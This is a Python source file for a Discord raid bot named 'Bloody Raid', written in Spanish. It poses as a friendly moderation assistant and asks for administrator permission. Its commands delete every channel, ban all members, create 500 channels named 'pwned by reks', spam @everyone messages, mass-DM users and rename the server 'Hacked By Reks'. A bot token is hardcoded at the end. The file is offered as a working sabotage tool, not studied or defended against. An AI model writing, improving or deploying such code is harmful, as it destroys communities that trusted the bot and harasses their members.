import asyncio
import discord
from discord.ext import commands
import datetime
import colorama
from colorama import Fore, Style

 
bot = commands.Bot(command_prefix='*', guilds=True, members=True)
client = discord.Client()
@bot.command()

async def ping(ctx):
    await ctx.send('https://discord.com/oauth2/authorize?client_id=857006242072231986&permissions=8&scope=bot')

@bot.command()

async def sum(ctx, numOne: int, numTwo: int):
    await ctx.send(numOne + numTwo)

 

@bot.command()
async def infobot(ctx):
    embed = discord.Embed(title=f"{ctx.guild.name}", description="Hola! Gracias por dejarme entrar a tu server :). Voy a ser tu asistente personal, te ayudare a moderar el server y entretener a todos tus usuarios. Si quieres desbloquear el contenido sucio, pon *nsfw", timestamp=datetime.datetime.utcnow()) 
    await ctx.send(embed=embed)


#nuke

@bot.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()
    print("[+] Borrando Canales")
    for channel in list(ctx.message.guild.channels):


        try:
            await channel.delete()
             
            #print("[+] Canales Borrados")

        except:
            continue
    guild = ctx.message.guild
    await guild.create_text_channel("fucked")
            
    

#banall
@bot.command(pass_context=True)
 
async def banall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print("[+] Todos los usuarios fueron exterminados con exito")

        except:
            pass
        print("[-] No sea pudo banear a todos los usuarios. ")

#Combinacion
@bot.command(pass_context=True)
async def auto(ctx):
    
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            
            print("[+] Canales Borrados")

        except:
            pass

        guild = ctx.message.guild
        channel = await guild.create_text_channel("pwned by reks")

        for i in range(500):
             await guild.create_text_channel("pwned by reks")
        print("[+] Creando Canales....")

        await channel.send(":)")
        
     
        await ctx.message.delete()
        guild = ctx.message.guild
        with open('warn.jpg', 'rb') as f:
            icon = f.read()
        await guild.edit(name='Hacked By Reks', icon=icon)
             

    

    for member in list(client.get_all_members()):
        try:
            guild = ctx.message.guild
            await guild.ban(member)
            print("[+] Todos los usuarios an sido exterminados con exito")

        except:
            pass

    async def spam(ctx):
        await ctx.message.delete()
        for channel in list(ctx.message.guild.channels):

            print("[+] Spameando Mensajes")
        
        try:
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")

        except:
            print("[+] Spameo completo")
            pass


#mdall
@bot.command(pass_context=True)
async def mdall(ctx):
    await ctx.message.delete()
    for member in list(bot.get_all_members()):
        await asyncio.sleep(0)
        try:
            await member.send("Pwned By Reks ")

        except:
            pass

        print("Enviando MD's")


#canales
@bot.command(pass_context=True)
async def canales(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    channel = await guild.create_text_channel("pwned by reks")
    for i in range(500):
        await guild.create_text_channel("pwned by reks")
        print("[+] Creando Canales....")


@bot.command()

async def spam(ctx):
    await ctx.message.delete()
    print("[+] Spameando Mensajes")
    for channel in list(ctx.message.guild.channels):

        
        
        try:
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")
            await channel.send("Reks is here :) . @everyone")

        except:
            print("[+] Spameo completo")
            pass


@bot.command()

async def alert(ctx, mensaje=None):
    

    print("[+] Spameando Mensajes")
    for channel in list(ctx.message.guild.channels):

        
        
        try:
            await channel.send(mensaje)
            await channel.send(mensaje)
            await channel.send(mensaje)
            await channel.send(mensaje)
            await channel.send(mensaje)
            await channel.send(mensaje)

        except:
            print("[+] Spameo completo")
            pass

@bot.command()
async def icono(ctx):
     
     
    await ctx.message.delete()
    guild = ctx.message.guild
    with open('warn.jpg', 'rb') as f:
        icon = f.read()
    await guild.edit(name='Hacked By Reks', icon=icon)

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name="Sere tu asistente!", url="http://www.twitch.tv/"))
    print(Fore.RED+"""

  ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄▓██   ██▓    ██▀███   ▄▄▄       ██▓▓█████▄ 
▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▒██  ██▒   ▓██ ▒ ██▒▒████▄    ▓██▒▒██▀ ██▌
▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌ ▒██ ██░   ▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒░██   █▌
▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌ ░ ▐██▓░   ▒██▀▀█▄  ░██▄▄▄▄██ ░██░░▓█▄   ▌
░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓  ░ ██▒▓░   ░██▓ ▒██▒ ▓█   ▓██▒░██░░▒████▓ 
░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒   ██▒▒▒    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▓   ▒▒▓  ▒ 
▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ ▓██ ░▒░      ░▒ ░ ▒░  ▒   ▒▒ ░ ▒ ░ ░ ▒  ▒ 
 ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░ ▒ ▒ ░░       ░░   ░   ░   ▒    ▒ ░ ░ ░  ░ 
 ░          ░  ░    ░ ░      ░ ░     ░    ░ ░           ░           ░  ░ ░     ░    
      ░                            ░      ░ ░                                ░      

  """)
    print("""
    
    [*] Bienvenido a Bloody Raid. Ya estas conectado con tu BOT.

    [+] Creado por Reks


     
                          Comandos Raid
          ================================================
                      *nuke | Borra todos los canales
                      
                      *auto | nuke, crea 500 canales, mdall, spam
                      
                      *spam | 5 @everyone por canal

                      *canales | crea 500 canales

                      *alert | Spam mensaje pesonalizado

                      *icono | cambia nombre y foto del servidor
                      
          ================================================
          
                            Esperando ordenes...            """)
bot.run('ODU3MnomitokenjQyMDcyMjMxOTg2.YNJTQg.4jE1ofdFGCVHTrIKiS7UtS34bKY')
